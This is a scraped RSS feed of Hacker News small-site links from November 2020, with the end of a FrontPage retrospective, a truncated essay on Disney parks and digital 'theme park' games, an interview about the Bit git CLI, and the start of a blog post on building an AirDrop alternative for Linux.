<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://invisibleup.com//articles/33/">https://invisibleup.com//articles/33/</a></em></p>]]>
            </description>
            <link>https://invisibleup.com//articles/33/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155442</guid>
            <pubDate>Thu, 19 Nov 2020 23:06:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital Theme Park Platforms: The Most Important Media Businesses of the Future]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155314">thread link</a>) | @natex
<br/>
November 19, 2020 | https://www.matthewball.vc/all/digitalthemeparkplatforms | <a href="https://web.archive.org/web/*/https://www.matthewball.vc/all/digitalthemeparkplatforms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5d8e94500fa50d2aaaa7c406" id="sections">
  
    <section data-section-id="5d8e94500fa50d2aaaa7c408" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0
},
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
&quot;customSectionHeight&quot;: 10,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5e644cbd1f4bbe1201cae5d2"><div><div><div data-block-type="5" id="block-509f2b77bcb05cb3a13e"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583631643226-40206LFTFFRWCM9H2G48/ke17ZwdGBToddI8pDm48kFTEgwhRQcX9r3XtU0e50sUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcW7uEhC96WQdj-SwE5EpM0lAopPba9ZX3O0oeNTVSRxdHAmtcci_6bmVLoSDQq_pb/maxresdefault.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583631643226-40206LFTFFRWCM9H2G48/ke17ZwdGBToddI8pDm48kFTEgwhRQcX9r3XtU0e50sUUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcW7uEhC96WQdj-SwE5EpM0lAopPba9ZX3O0oeNTVSRxdHAmtcci_6bmVLoSDQq_pb/maxresdefault.jpg" data-image-dimensions="1280x720" data-image-focal-point="0.5,0.5" alt="maxresdefault.jpg" data-load="false" data-image-id="5e644d1bad7cab40b9b19f03" data-type="image" src="https://www.matthewball.vc/all/maxresdefault.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-83d26a75802dd2ca90d0"><div><p><span><strong><em>Chapter One: The Past </em></strong></span></p><p>Disney is the envy of every media company, regardless of whether it focuses on film, TV, gaming, music or publishing. In plain terms, there has never been a more dominant entertainment company, globally or in the US. It has a brand that actually matters to consumers, owns franchises that consumers essentially treat like subscription content services, and operates the biggest star-making platforms in the world. And as strong as this platform was at the start of 2019, it exited the year even stronger. In a matter of weeks, Disney’s brand new direct-to-consumer platform acquired 30MM subscribers.</p><p>The deeper we get into the digital era, the more dominant Disney seems to become. After all, it was long expected that the Internet would disrupt dominant media companies and IP via rights infringement and the emergence of myriad user-generated “franchises”. However, one of the biggest storytelling “lessons” in the 20th and early 21th century was that audiences have an unending desire for “more” of the stories they <em>already </em>love. And the Internet has enabled this to an unprecedented degree. You can constantly track production (cast Instagrams, behind-the-scenes featurettes, and leaks on social media), engage in fan communities (message boards and YouTube theory/Easter egg videos), consume endless amounts of fan content (e.g. fanfic and watch-along podcasts), play this content back on demand (e.g. Netflix), and engage in never-ending and constantly updated online multiplayer games (e.g. Star Wars: Battlefront 2). This is a powerful, self-sustaining financial and cultural flywheel. And Disney has many of the franchises that best lend themselves to this model. Many of those they don’t own, such as <em>Harry Potter</em>, have their rights fragmented.</p><p>But what is the strongest, most profitable, most defensible part of Disney’s business in the digital era? Its capex-heavy, physical theme parks.</p><p>There is no simple way to quantify how important this business unit is to Disney. The financial role is obvious. Disney’s Parks &amp; Attractions segment generates nearly 100% more revenue and 60% more profit than Disney’s studio division (which already generates nearly three times the revenue AND three times the gross <em>margins </em>as its primary competitors). By turning hit films into theme park attractions, not only does Disney generate more “upside” from a hit than its competitors do, Disney’s breakeven point for these films is also much lower. But the parks are much more than this direct financial benefit. There is nothing that can compare to the impact of a child being hugged by her heroes. The ability to enjoy your favorite IP as “you” is unique and lasts a lifetime. Consider, for example, how many families have Disneyland photos of their kids with Mickey or Woody on the fridge. Or how many of these kids have kept those photos decades later (and compared them to their eventual spouse’s version of that same photo).</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583704876360_17902"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png" data-image-dimensions="2500x1247" data-image-focal-point="0.5,0.5" alt="Jacob Navok  with his father in 1986; Jacob Navok with his son in 2020" data-load="false" data-image-id="5e656b6de2671908cf0b1c50" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704955879-DXS743LVFW9K8XHLJW04/ke17ZwdGBToddI8pDm48kEbi0xOcUBMPtPJ1nKxl34J7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iqinJXUwCvfZzt2c3UTmyH0_133MZg2Ed6tGbaptjvtwPfRGq2WUoRdTo2H3IkSnA/Comparison.png">
          </p>
        
          
        

        
          
          <figcaption>
            <p><a href="https://twitter.com/jnavok?lang=en">Jacob Navok</a> with his father in 1986; Jacob Navok with his son in 2020</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583704876360_24796"><div><p>And because of real estate scarcity, lengthy build times, enormous capital requirements (exacerbated by<a href="http://en.wikipedia.org/wiki/Baumol's_cost_disease"> Baumol’s Cost Disease</a>), Disney’s theme parks, resorts, and cruises are incredibly difficult to replicate by another Western media company. It would take twenty years and tens of billions of dollars for AT&amp;T/WarnerMedia to receive permits, design attractions, and build a fully operational theme park, for example (and it’d probably be in the middle of nowhere). It’s especially hard to imagine all of this occurring while the company is investing tens of billions per year into HBO Max, new 5G network infrastructure, and maintenance capex (while also sustaining tens of billions in dividends and debt service, and fending off agitated investors). Comcast/Universal has an ambitious plan to grow its parks footprint, including new resorts in Russia, South Korea, and Singapore. However, these will take years and tens of billions of dollars. Purely comping the number of parks also overlooks the scale differential. Disney’s Orlando resort, for example, is over 25,000 acres (half used). Universal Studios Orlando is barely 500. In addition, Disney operates four cruise ships (another three are due by 2023), while no competitor does. Overall, Disney’s theme parks business generates more than $26B per year with 175MM+ visitors, compared to 6B for Universal Studios, with 50MM.</p><p>However, the defensibility and value of these businesses goes beyond physical and financial barriers to entry; running a successful theme park means far more than designing a fun ride. Giving real hugs to kids is incredibly dangerous — doing this reliably, safely, and positively millions of times per year requires enormous training (the parks also operate hospitals, pet day care and police services, too!). In addition, these parks must cater to a wide variety of different customers with different needs, physical capabilities, and developmental maturity. In contrast, a film or TV show has only one version that lasts forever and is infinitely repeatable with 100% consistency. There is no other “medium” in the entertainment industry that requires melding more art forms (e.g. live performance, set design, music, engineering) with a smaller margin for error, and at such a great scale. The benefit, though, is a rich, hard to replicate and intimate understanding of the consumer.</p><p>The competitive consequences are profound and only growing. Fans simply cannot enjoy DC or Lord of the Rings or Dragon Ball the way they do Disney’s Princesses, Pixar, most recently, Star Wars, and soon, the Avengers franchises. This fundamentally limits a franchise’s ability to grow love — the lifeblood (and profit driver) of all IP-based companies.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583703445914_105588"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <a href="https://www.matthewball.vc/all/marginalaffinity" data-animation-role="image" data-description="">
            
            <img data-src="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704276350-57SC1180IMU577Q1G2VV/ke17ZwdGBToddI8pDm48kHOrWH00r8lczZbSY6Q3rqZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIs8DdG5mDMJJVuX1u-bmhC-P6JCcY2JAH49h2IsMFZkcKMshLAGzx4R3EDFOm1kBS/worship-cat-egypt-750x477.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5d8e9007bc3d0e18a4c49673/1583704276350-57SC1180IMU577Q1G2VV/ke17ZwdGBToddI8pDm48kHOrWH00r8lczZbSY6Q3rqZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIs8DdG5mDMJJVuX1u-bmhC-P6JCcY2JAH49h2IsMFZkcKMshLAGzx4R3EDFOm1kBS/worship-cat-egypt-750x477.jpg" data-image-dimensions="750x365" data-image-focal-point="0.5,0.5" alt="worship-cat-egypt-750x477.jpg" src="https://www.matthewball.vc/all/worship-cat-egypt-750x477.jpg">
            
          
            </a>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703445914_134473"><div><p>This is why brands like 20th Century Fox and WarnerMedia license their theme park IP from super-popular brands like <em>Avatar</em>, <em>The Simpsons</em>, and <em>Harry Potter</em> to their competitors, Disney and Universal. Nintendo also partnered with Universal for its theme park rights. This extension is strategically important and financially valuable, but it’s also quite costly. The rights owner, for example, neither owns the customer relationship nor do they deliver the end-customer experience (in a weird way, Universal has a closer relationship with <em>Harry Potter</em> fans than WarnerMedia does). In addition, the majority of associated profits go to the park operator — who also gets to intermingle their IP and draft off the popularity of their competitors’ franchises, too. That’s risky in an age where franchises and <a href="https://www.matthewball.vc/all/disneylessons">clarity of franchise ownership is key</a>.</p><p>So, as we embrace the digital era, it’s funny to consider the enduring and durable significance of the analogue theme parks business. It is incredibly profitable and will continue to grow as new mobile technology/personalization enhance the park-going experience. The barriers to replication are incredibly high and span both fixed investment (land and infrastructure) and skillset (e.g. design and boots-on-the-ground operations). It also offers an intimate understanding of the consumer, is particularly potent when connected to an IP flywheel, and is able to constantly renew its appeal through new attractions and updates.</p><p><span><strong><em>Chapter Two: The (Start of the) New Theme Parks</em></strong></span></p><p>These parks exist and thrive because of our desire to be “inside a living story”. This was Walt’s primary goal with Disneyland: to go beyond passive consumption and into active immersion. Consider the following quote from one of Disney’s chief Imagineers: </p><blockquote><p><em>“Disneyland is an experience involving many moving parts in harmony, like an orchestra. Everything has to be tuned, what you hear, what you smell, what you see, how you see it, the speed at which you assimilate all of that, just like a film, is choreographed. But how do you choreograph that if you don't control the camera, because the camera is you — it's you when you come to Disneyland".</em></p></blockquote><p>This idea of agency is key. There’s only so much time one can spend in a physical or virtual world as a pre-defined character. That doesn’t mean we want to remain an exact replica of our “IRL” selves — we might want to be taller, or blue, or metal, and so on. But when you’re <em>specifically </em>Iron Man, there are limits to what you can look like, how you can behave, what you can do or be, where you can go, and how long it makes sense to be there. After all, you can’t actually be Iron Man, just pretend to be. And certainly, it doesn’t make sense if all of your friends are all Iron Man, too.</p></div></div><div data-block-json="{&quot;cache_age&quot;:&quot;3153600000&quot;,&quot;authorUrl&quot;:&quot;https://twitter.com/DonaldMustard&quot;,&quot;width&quot;:550,&quot;resolveObject&quot;:&quot;Tweet&quot;,&quot;html&quot;:&quot;<blockquote class=\&quot;twitter-tweet\&quot;><p lang=\&quot;en\&quot; dir=\&quot;ltr\&quot;>In Fortnite you will always be you. Agency is the key.</p>\u2014 Donald Mustard (@DonaldMustard) <a href=\&quot;https://twitter.com/DonaldMustard/status/1205968434690838529?ref_src=twsrc%5Etfw\&quot;>December 14, 2019</a></blockquote>\n<script async=\&quot;\&quot; src=\&quot;https://platform.twitter.com/widgets.js\&quot; charset=\&quot;utf-8\&quot;></script>&quot;,&quot;url&quot;:&quot;https://twitter.com/DonaldMustard/status/1205968434690838529&quot;,&quot;resolvedBy&quot;:&quot;twitter&quot;,&quot;authorName&quot;:&quot;Donald Mustard&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;resolved&quot;:true,&quot;type&quot;:&quot;rich&quot;,&quot;providerName&quot;:&quot;Twitter&quot;,&quot;providerUrl&quot;:&quot;https://twitter.com&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1583703445914_20087"><div><blockquote><p lang="en" dir="ltr">In Fortnite you will always be you. Agency is the key.</p>— Donald Mustard (@DonaldMustard) <a href="https://twitter.com/DonaldMustard/status/1205968434690838529?ref_src=twsrc%5Etfw">December 14, 2019</a></blockquote>
</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703454850_7992"><div><p>For decades, the only real way to experience a digital world with agency and an individual sense of self was to go to the theme park. Games have been on the cusp of these experiences for years, but in 2020, they’re well under way. These are “games” like Minecraft, Fortnite, Roblox, to a lesser extent GTA Online, and Pokémon Go. </p><p>These titles offer many unique advantages compared to their analogue analogues. For example, they are always “open”, “everywhere”, “full of your friends”, and …</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.matthewball.vc/all/digitalthemeparkplatforms">https://www.matthewball.vc/all/digitalthemeparkplatforms</a></em></p>]]>
            </description>
            <link>https://www.matthewball.vc/all/digitalthemeparkplatforms</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155314</guid>
            <pubDate>Thu, 19 Nov 2020 22:51:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reimagining the Git CLI: an interview with the creator of Bit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25154943">thread link</a>) | @chriswalz
<br/>
November 19, 2020 | https://chriswalz.com/posts/an-interview-with-chris-walz-of-bit/ | <a href="https://web.archive.org/web/*/https://chriswalz.com/posts/an-interview-with-chris-walz-of-bit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    <p><em>This interview was hosted by Jackson Kelley from Console originally posted <a href="https://console.substack.com/p/console-23">here</a></em></p>
<h3 id="what-is-your-background">What is your background?</h3>
<p>I was born and raised in NY. I started off with the privilege of working as an intern at Google. I then moved on to working in FinTech, InsurTech, and now Construction Tech (ConstruTech?). I enjoy my fair share of table tennis and gaming. (Fun fact: I once reached the #1 rank on the StarCraft 2 ladder (2v2s))</p>
<p>My first foray into programming was in High School. I took a computer science intro course and made some cool things like a flash game where each sprite was a meme from Reddit rage comics. However, I didn’t feel confident in my programming abilities and ended up majoring in Accounting instead. I quickly realized that Accounting was not for me 😅 and switched to Finance. Halfway through college, I started reading about programming and it “clicked”. I began experimenting with Android programming (Shout out to <a href="https://www.amazon.com/Android-Programming-Ranch-Guide-Guides/dp/0321804333">The Big Nerd Ranch Guide</a>) and never stopped coding since then. You can check out my old Flappy Bird inspired Android game <a href="https://play.google.com/store/apps/details?id=com.walz.joltimate.downfall2&amp;hl=en_US">here</a>. All in all, I graduated with a B.S. in Finance and a minor in Computer Science.</p>
<p>My favorite language is Go but I mostly use Java and JavaScript during work. I try to steer away from using frameworks when I can but I like the Go web framework Echo. I use React + Redux although I’ve come to realize over time that Redux is overused and leads to too much global state.</p>
<h3 id="why-do-you-try-to-avoid-frameworks">Why do you try to avoid frameworks?</h3>
<p>Frameworks tend to have magic which can be convenient but also frustrating to work with when you want more customization or you’re dealing with a nasty bug which turns out to be the framework silently undermining you. This is not to say that you shouldn’t use frameworks and it goes on a case by case basis.  Frameworks are usually “high level” and hide details. This is convenient but if you’re simply seeking to learn how to code this may not be beneficial.</p>
<p>Libraries are easier to wrap your head around since it will only do something if you explicitly tell it to do so. In turn, one can more easily rule out whether a bug is due to a library for example. The whole system of a computer operates like this to an extent. There are applications built to run on an operating system that runs commands on the kernel which in turn interfaces with the hardware. This system of components and layers is only possible due to API’s/Libraries.</p>
<h3 id="why-was-bit-started">Why was bit started?</h3>
<p>Bit is the summation of a passion for UX, laziness, and a healthy frustration with git’s CLI. Git’s CLI, as many of its users know, has a plethora of commands and options. When you multiply out all the combinations of commands by the number of options and their potential parameters you get A LOT of choices. On top of that, there’s the cornucopia of jargon (detach, head, ref, commit to name a few) and abstruse know-how that, in conjunction, can seduce you into a monotonous hell hole of learning the internal workings of git. Or perhaps put another way – you begin to understand why there is a 500-page book about git. It’s worth pointing out that I like git – but I also enjoy the cathartic pleasure of poking fun at it. Much respect to Linus and all the maintainers that have brought git to where it is today.</p>
<p>So anyway… the inklings of bit began when I started asking myself why doesn’t git’s CLI do this? Why doesn’t git have an undo button? At some point, I said enough is enough, opened an editor, and started writing some code. Bit started out as this grand new git workflow that would completely change the way people would use git. Or at least that was the plan. After developing it and showing it to some friends I got the vibe that perhaps bit was too opinionated and I decided to dial back some of the changes and focus on an improved UX experience. It started all coming together – intelligent suggestions, branches sorted by most recent, proactive fast-forwarding to avoid merge conflicts and full compatibility with all git commands. A lot of this either alleviates the “maintenance” type tasks of git or helps reduce the working memory that git takes to allow you to focus more on the task at hand.</p>
<p>Bit has come a long way in such a short period of time considering the very first commit was only just over a month ago. Seeing all the overwhelmingly positive feedback is almost surreal and I’m thankful to all its supporters.  It’s even cooler working with folks across the world to make bit a bit better each day.</p>
<h3 id="are-there-any-overarching-goals-of-bit-that-drive-design-or-implementation">Are there any overarching goals of bit that drive design or implementation?</h3>
<p>Ease. Of. Use. I love simple interfaces (Google Search, Docker Run, the “Easy Button”).  Google Docs is a powerful interface as well (albeit not quite as simple). It does some complex work behind the scenes such as automatic saving, automatic synchronization &amp; distribution, automatic versioning (yes, Google Docs does that as well). It made me wonder how those principles can be applied to version control.  This became the inspiration for the <code>bit sync</code> command.</p>
<p>Put the onus on the program, not the user. Some of bit’s naysayers claim that higher-order commands (e.g. bit sync, git pull) take away from the user’s understanding. Personally, I find that to be a rather weak argument. Abstractions are powerful. Small interfaces are better than large ones. Bit allows you to use all git commands anyway so the trade-off is mitigated in this way.</p>
<h3 id="what-is-the-most-challenging-problem-thats-been-solved-in-bit-so-far">What is the most challenging problem that’s been solved in bit so far?</h3>
<p>There have been many challenges:  creating a uniform experience across Operating Systems and Shells,  implementing tab completion, displaying fast interactive prompts, simple installs, and lastly learning lots about git itself 😅. I’d say the biggest challenge I solved(ish) is marketing! Marketing is hard. Even harder for programmers. I posted all over the internetz. Reddit, Discord, Twitter, StackOverflow, and even got my first couple of Stars via a link from another Github repo. Of course, Hacker News was the most successful, hitting #2 on the front page. Interestingly, the first time I posted it fell by the wayside with a measly 5 points 🤷‍♂️. All of this marketing took a lot of time and consideration to get the messaging right on the posts and the landing page (Github README). Not to mention the worry that it’d all be for naught.</p>
<h3 id="is-bit-intended-to-eventually-be-monetized-if-it-isnt-monetized-already">Is bit intended to eventually be monetized if it isn’t monetized already?</h3>
<p>Git is free and open-source so I feel it is only right to continue forward in that spirit and keep bit free and open-source.</p>
<p><a href="https://github.com/sponsors/chriswalz">Donations</a> are welcome though (wink, wink)!</p>
<h3 id="where-do-you-see-bit-heading-next">Where do you see bit heading next?</h3>
<p>Continued innovation of the UX. Polishing the small details that “delight the user.” The dream goal would be to make such an impact that Git’s CLI UX itself would improve due to the success of bit. Another interesting avenue would be bit aliases that could be written in Go. I hope bit inspires future developers about how the CLI experience, in general, can be improved. I think <a href="https://fishshell.com/">Fish</a> is doing great work on this front (I had the pleasure of discovering it during my research for bit).  I look forward to the continuing innovation of the shell/CLI space.</p>
<h3 id="where-do-you-see-software-development-in-general-heading-next">Where do you see software development, in general, heading next?</h3>
<p>Tough question! There are many possibilities considering how quickly innovation happens nowadays. My instinct tells me “No-Code” and “Low-Code” solutions will become increasingly common. Perhaps it will be more visually based where a designer literally draws out a system and an AGI figures out the details (or vice-versa). Maybe even further into the future we will all be hooked up to a Neuralink and code will just spew out of our brains and then we’ll all understand why there’s a programming language called Brain****.</p>
<h3 id="where-do-you-see-open-source-heading-next">Where do you see open-source heading next?</h3>
<p>I’m rather new to open-source so take my thoughts with a grain of salt. Open-source appears to have a bright future. There seems to be a need for continued innovation around licensing to prevent companies from taking advantage of open-source projects.</p>
<p>GitHub introduced Sponsoring is a fantastic way to <a href="https://github.com/sponsors/community">give back</a> to the open-source community.</p>
<p>I think there should be significantly more financial support for projects. It’s unfortunate to see so many projects stop getting maintained over time considering how fundamental they are to companies, big and small. Perhaps implementing some sort of government open-source Incentive program that encourages businesses to donate to open-source projects would make open-source flourish even more.</p>
<p>Also, bringing more attention to open-source through what Console is doing is really great to see.</p>
<h3 id="what-is-one-question-you-would-like-to-ask-another-open-source-developer-that-i-didnt-ask-you">What is one question you would like to ask another open-source developer that I didn’t ask you?</h3>
<p>How do you go about resolving an issue (specifically bugs) that a user files?</p>
<h3 id="what-is-the-best-way-for-a-new-developer-to-contribute-to-bit">What is the best way for a new developer to contribute to bit?</h3>
<p>Submitting issues &amp; pull requests is nice. Also, changes to the README is quite useful (even with all the fallout from Hacktoberfest!). Look at the <a href="https://github.com/chriswalz/bit/issues">issues</a> page and look for “good first issue” labels. Also, if you feel like you <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">don’t know what you’re doing</a> – don’t worry, no one does 😛.</p>

  </section></div>]]>
            </description>
            <link>https://chriswalz.com/posts/an-interview-with-chris-walz-of-bit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154943</guid>
            <pubDate>Thu, 19 Nov 2020 22:08:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China poised to overtake the US as the world leader in AI]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25154748">thread link</a>) | @lawschool333
<br/>
November 19, 2020 | https://www.pairagraph.com/dialogue/e146661eca504e4d9edeb1d68fc8f2f6/2 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/e146661eca504e4d9edeb1d68fc8f2f6/2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/e146661eca504e4d9edeb1d68fc8f2f6/2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25154748</guid>
            <pubDate>Thu, 19 Nov 2020 21:43:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to AirDrop to Linux]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25154508">thread link</a>) | @gtf21
<br/>
November 19, 2020 | https://ro-z.net/blog/ios-development/how-to-airdrop-to-linux-part-1/ | <a href="https://web.archive.org/web/*/https://ro-z.net/blog/ios-development/how-to-airdrop-to-linux-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><img loading="lazy" src="https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted-1024x762.png?resize=512%2C381&amp;ssl=1" alt="" width="512" height="381" srcset="https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=1024%2C762&amp;ssl=1 1024w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=300%2C223&amp;ssl=1 300w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=768%2C571&amp;ssl=1 768w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=1536%2C1143&amp;ssl=1 1536w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?resize=403%2C300&amp;ssl=1 403w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?w=1601&amp;ssl=1 1601w, https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/shutterstock_128685047-Converted.png?w=1168&amp;ssl=1 1168w" sizes="(max-width: 512px) 100vw, 512px" data-recalc-dims="1"><figcaption>A Father and Son File Sharing App Project</figcaption></figure></div>



<p>I mostly work and play within the Apple ecosystem and <a href="https://support.apple.com/en-gb/HT204144">AirDrop</a>, <a href="https://support.apple.com/en-gb/HT204681">Continuity</a> and other integration between devices is extremely useful and convenient. <a href="https://llguy.github.io/">My son</a> recently converted himself to Linux and started to miss the ability to easily move photos, text, or url between his phone and his Linux computer. Being a hacker himself, he thought it would be a great idea to devise an app that let’s you move information from your phone to your computer, and more generally a “cross platform AirDrop substitute for geeks”…</p>



<p>Of course, one solution would be to <a href="http://www.google.com/search?q=how+to+airdrop+to+linux">google</a> and figure out if such an app exists, but where is the fun in that? We decided to take on a Father-Son new project and build our own solution. </p>



<p>The result ended up surprisingly useful, we made it open-source, you can find the <a href="https://github.com/roznet/remotestash">working code here</a> and the <a href="https://apps.apple.com/us/app/remotestash/id1516090251?ls=1">app on the store</a>. As we learned a few new technologies along the way, we decided to write about the approach as hopefully it could be useful to other.</p>



<p>In this first part, we’ll go over the overall approach, then the iPhone Application implementation and finally the python implementation on the computer.</p>



<h2>The Philosophy</h2>



<p>My son’s philosophy being “anything beyond using a <a href="https://en.wikipedia.org/wiki/Network_socket">socket API</a> and crafting your own network packets would be too high level”, he started writing some <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C code</a>, building his own protocol, communicating with a cloud server he rents on <a href="https://www.digitalocean.com/">Digital Ocean</a> with his weekly allowance.</p>



<p>I wanted to take the opportunity to show him how to leverage higher level libraries even languages like python to get the desired result quickly. We targeted to get a proof of concept, including learning the require component within one week-end. No choice but to leverage existing frameworks…</p>



<p>The philosophy of the tool would be on the phone to be as user friendly and natively integrated to the phone system as possible. On the computer it would be natural for a linux geek, command line based and loosely inspired by some of the <code>git</code> concept of <code>pull</code>, <code>push</code> and <code>stash</code>. No fancy UI and definitely no mouse. Using the mouse is probably more of an heresy for my son that using a high-level library. He lives in the terminal, emacs and the i3 tile window manager. We would also try to be as generic as possible on the items that could be shared, images, text, files, but start with the basic he needed: text, url and photos.</p>



<h2>The Approach</h2>



<p>We needed to decide on three core components: how to store and track the items to be shared – the stash, how the devices would discover each other on the network and how to share the actual items on the network across devices</p>



<h3>stash</h3>



<p>We needed to keep that simple. No database or anything complex, we went for a linux like approach of keeping a dot directory in the home of the user where the supporting files would be kept as well as the actual items themselves saved as files.</p>



<h3>discovery</h3>



